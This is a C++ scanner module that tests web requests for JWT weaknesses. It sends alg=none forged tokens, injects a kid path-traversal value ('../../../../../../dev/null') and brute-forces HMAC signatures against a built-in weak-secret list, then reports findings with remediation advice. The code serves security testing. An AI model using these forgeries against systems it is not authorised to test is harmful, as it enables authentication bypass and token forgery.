#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>

#ifdef small
#undef small
#endif

#pragma comment(lib, "Bcrypt.lib")

#include "../scanner_module.hpp"

#include <algorithm>
#include <cctype>
#include <cstdint>
#include <cstring>
#include <nlohmann/json.hpp>
#include <regex>
#include <sstream>
#include <string>
#include <vector>

namespace aida {
namespace burp {
namespace scanner {

namespace {

std::string lc(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
    return s;
}

std::string b64url_encode(const std::vector<uint8_t>& data)
{
    static const char kT[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    std::string out;
    int bits = 0, n = 0;
    for (uint8_t b : data)
    {
        n = (n << 8) | b;
        bits += 8;
        while (bits >= 6) { bits -= 6; out.push_back(kT[(n >> bits) & 0x3f]); }
    }
    if (bits > 0) out.push_back(kT[(n << (6 - bits)) & 0x3f]);
    return out;
}

std::string b64url_encode_str(const std::string& s)
{
    return b64url_encode(std::vector<uint8_t>(s.begin(), s.end()));
}

std::vector<uint8_t> b64url_decode(const std::string& s)
{
    std::vector<uint8_t> out;
    auto val = [](char c) -> int {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '-' || c == '+') return 62;
        if (c == '_' || c == '/') return 63;
        return -1;
    };
    int bits = 0, n = 0;
    for (char c : s)
    {
        if (c == '=' || c == '\r' || c == '\n' || c == ' ') continue;
        int v = val(c);
        if (v < 0) continue;
        n = (n << 6) | v;
        bits += 6;
        if (bits >= 8) { bits -= 8; out.push_back(static_cast<uint8_t>((n >> bits) & 0xff)); }
    }
    return out;
}

bool hmac_sha256(const std::vector<uint8_t>& key, const std::string& data, std::vector<uint8_t>& out)
{
    out.clear();
    BCRYPT_ALG_HANDLE alg = nullptr;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(st)) return false;
    DWORD object_len = 0; ULONG cb = 0;
    if (!BCRYPT_SUCCESS(BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PUCHAR>(&object_len), sizeof(object_len), &cb, 0)))
    { BCryptCloseAlgorithmProvider(alg, 0); return false; }
    std::vector<uint8_t> obj(object_len);
    BCRYPT_HASH_HANDLE h = nullptr;
    std::vector<uint8_t> key_copy = key;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &h, obj.data(), object_len, key_copy.empty() ? nullptr : key_copy.data(), static_cast<ULONG>(key_copy.size()), 0)))
    { BCryptCloseAlgorithmProvider(alg, 0); return false; }
    std::vector<uint8_t> tmp(data.begin(), data.end());
    BCryptHashData(h, tmp.empty() ? nullptr : tmp.data(), static_cast<ULONG>(tmp.size()), 0);
    out.resize(32);
    BCryptFinishHash(h, out.data(), 32, 0);
    BCryptDestroyHash(h);
    BCryptCloseAlgorithmProvider(alg, 0);
    return true;
}

struct jwt_t
{
    std::string raw;
    std::string header_b64;
    std::string payload_b64;
    std::string sig_b64;
    std::string header_json;
    std::string payload_json;
    std::string alg;
    std::string kid;
};

std::vector<jwt_t> find_jwts(const std::string& base_request)
{
    static const std::regex jwt_re(R"((eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*))");
    std::vector<jwt_t> out;
    auto begin = std::sregex_iterator(base_request.begin(), base_request.end(), jwt_re);
    auto end = std::sregex_iterator();
    for (auto it = begin; it != end; ++it)
    {
        jwt_t j;
        j.raw = (*it)[1].str();
        auto d1 = j.raw.find('.');
        auto d2 = j.raw.find('.', d1 + 1);
        if (d1 == std::string::npos || d2 == std::string::npos) continue;
        j.header_b64 = j.raw.substr(0, d1);
        j.payload_b64 = j.raw.substr(d1 + 1, d2 - d1 - 1);
        j.sig_b64 = j.raw.substr(d2 + 1);
        auto h_bytes = b64url_decode(j.header_b64);
        auto p_bytes = b64url_decode(j.payload_b64);
        j.header_json.assign(h_bytes.begin(), h_bytes.end());
        j.payload_json.assign(p_bytes.begin(), p_bytes.end());
        auto hj = nlohmann::json::parse(j.header_json, nullptr, false);
        if (!hj.is_discarded() && hj.is_object())
        {
            if (hj.contains("alg") && hj["alg"].is_string()) j.alg = hj["alg"].get<std::string>();
            if (hj.contains("kid") && hj["kid"].is_string()) j.kid = hj["kid"].get<std::string>();
        }
        out.push_back(std::move(j));
    }
    return out;
}

std::vector<uint8_t> swap_token(const std::string& base, const std::string& old_tok, const std::string& new_tok)
{
    std::string out = base;
    size_t pos = 0;
    while ((pos = out.find(old_tok, pos)) != std::string::npos)
    {
        out.replace(pos, old_tok.size(), new_tok);
        pos += new_tok.size();
    }
    return std::vector<uint8_t>(out.begin(), out.end());
}

const char* kWeakSecrets[] = {
    "secret", "123456", "password", "admin", "jwt", "token", "key", "null", "",
    "your-256-bit-secret", "secretkey", "super_secret", "supersecret", "my_secret",
    "mysecret", "jwtsecret", "jwt_secret", "jwt-secret", "jwt_key", "jwt-key",
    "test", "testing", "example", "examplekey", "sample", "insecure", "unsafe",
    "change-me", "changeme", "default", "root", "letmein", "welcome", "helloworld",
    "abc123", "qwerty", "monkey", "dragon", "hello", "world", "insecuresecret",
    "supersecretpasswordistrongbutverysecret", "randomkey", "secret_key", "secret-key",
    "app_secret", "app-secret", "appsecret", "key123", "key1", "key2", "node-jwt",
    "auth0", "cognito", "firebase"
};

bool try_secret(const jwt_t& j, const std::string& secret, std::string& out_token)
{
    std::vector<uint8_t> sig;
    std::string signed_input = j.header_b64 + "." + j.payload_b64;
    if (!hmac_sha256(std::vector<uint8_t>(secret.begin(), secret.end()), signed_input, sig)) return false;
    std::string sig_b64 = b64url_encode(sig);
    if (sig_b64 == j.sig_b64)
    {
        out_token = signed_input + "." + sig_b64;
        return true;
    }
    return false;
}

void jwt_run(const insertion_point_t& ip, const module_context_t& ctx, const send_fn_t& send)
{
    if (ip.kind != "header") return;
    if (lc(ip.name) != "host") return;

    auto jwts = find_jwts(ip.base_request);
    if (jwts.empty()) return;

    for (auto& j : jwts)
    {
        {
            probe_t p; p.payload = j.raw; p.marker = j.raw; p.variant = "informational";
            exchange_observed_t synthetic;
            synthetic.method = "GET";
            synthetic.scheme = ctx.tls ? std::string("https") : std::string("http");
            synthetic.host = ctx.host;
            synthetic.port = ctx.port;
            synthetic.resp_headers = ctx.baseline_response_headers;
            synthetic.resp_body = ctx.baseline_response_body;
            synthetic.status_code = ctx.baseline_status_code;
            auto iss = make_issue("jwt.detected",
                                  std::string("JWT detected (alg=") + (j.alg.empty() ? "?" : j.alg) + ")",
                                  severity_t::info, confidence_t::firm, ip, p, synthetic, ctx,
                                  std::string("Header=") + j.header_json + "; Payload=" + j.payload_json);
            iss.description = std::string("A JWT was detected in the request. alg='") + j.alg + "'"
                + (j.kid.empty() ? std::string() : ", kid='" + j.kid + "'") + ". Confirm pinning and signature validation.";
            iss.remediation = "Pin the expected alg; validate kid against an allowlist; check exp/nbf/iss/aud.";
            iss.cwe.push_back("CWE-345");
            issue_store::add(std::move(iss));
        }

        if (lc(j.alg) != "none")
        {
            nlohmann::json hj = nlohmann::json::parse(j.header_json, nullptr, false);
            if (!hj.is_discarded() && hj.is_object())
            {
                hj["alg"] = "none";
                std::string forged_header = b64url_encode_str(hj.dump());
                std::string forged = forged_header + "." + j.payload_b64 + ".";
                std::vector<uint8_t> raw = swap_token(ip.base_request, j.raw, forged);
                probe_t p; p.payload = forged; p.marker = forged; p.variant = "alg-none";
                auto resp = send(raw, p);
                if (resp.has_value() && resp->status_code == ctx.baseline_status_code &&
                    resp->status_code >= 200 && resp->status_code < 400)
                {
                    auto iss = make_issue("jwt.alg-none-accepted",
                                          "JWT alg=none accepted",
                                          severity_t::critical, confidence_t::firm, ip, p, *resp, ctx,
                                          std::string("forged token: ") + forged);
                    iss.description = "A re-encoded JWT with alg=none and empty signature was accepted by the server (status matches baseline). An attacker can forge arbitrary tokens.";
                    iss.remediation = "Reject tokens with alg=none. Pin the expected algorithm and verify the signature using a known key.";
                    iss.cwe.push_back("CWE-345");
                    issue_store::add(std::move(iss));
                }
            }
        }

        if (lc(j.alg) == "hs256" || lc(j.alg) == "hs384" || lc(j.alg) == "hs512")
        {
            for (const char* sec : kWeakSecrets)
            {
                std::string out;
                if (!try_secret(j, sec, out)) continue;
                probe_t p; p.payload = out; p.marker = sec ? sec : ""; p.variant = "weak-hmac-secret";
                exchange_observed_t synthetic;
                synthetic.status_code = ctx.baseline_status_code;
                synthetic.resp_headers = ctx.baseline_response_headers;
                synthetic.resp_body = ctx.baseline_response_body;
                auto iss = make_issue("jwt.weak-hmac-secret",
                                      "JWT signed with weak/known HMAC secret",
                                      severity_t::critical, confidence_t::firm, ip, p, synthetic, ctx,
                                      std::string("secret='") + sec + "'");
                iss.description = std::string("The JWT HMAC signature was reproduced offline using the secret '") + sec +
                    "'. An attacker can forge arbitrary tokens with administrative claims.";
                iss.remediation = "Rotate the HMAC secret immediately. Use a >=256-bit randomly generated key; consider switching to RS256/ES256.";
                iss.cwe.push_back("CWE-326");
                iss.cwe.push_back("CWE-798");
                issue_store::add(std::move(iss));
                break;
            }
        }

        if (!j.kid.empty())
        {
            nlohmann::json hj = nlohmann::json::parse(j.header_json, nullptr, false);
            if (!hj.is_discarded() && hj.is_object())
            {
                hj["kid"] = "../../../../../../dev/null";
                std::string forged_header = b64url_encode_str(hj.dump());
                std::string forged = forged_header + "." + j.payload_b64 + ".";
                std::vector<uint8_t> raw = swap_token(ip.base_request, j.raw, forged);
                probe_t p; p.payload = forged; p.marker = forged; p.variant = "kid-path-traversal";
                auto resp = send(raw, p);
                if (resp.has_value() && resp->status_code == ctx.baseline_status_code &&
                    resp->status_code >= 200 && resp->status_code < 400)
                {
                    auto iss = make_issue("jwt.kid-path-traversal",
                                          "JWT kid path-traversal accepted",
                                          severity_t::critical, confidence_t::firm, ip, p, *resp, ctx,
                                          std::string("forged kid points to /dev/null"));
                    iss.description = "A JWT with kid='../../../../../../dev/null' was accepted; attacker can point kid at predictable files to bypass signature verification.";
                    iss.remediation = "Treat kid as opaque; never use it as a file path. Reject kid values containing path separators.";
                    iss.cwe.push_back("CWE-22");
                    iss.cwe.push_back("CWE-345");
                    issue_store::add(std::move(iss));
                }
            }
        }
    }
}

bool register_self()
{
    module_t m;
    m.id = "jwt-scan";
    m.name = "JWT Vulnerabilities";
    m.category = "Authentication";
    m.max_probes_per_point = 10;
    m.probes = [](const insertion_point_t&, const module_context_t&) { return std::vector<probe_t>{}; };
    m.custom_run = jwt_run;
    return register_module(std::move(m));
}

const bool s_registered = register_self();

}

}
}
}
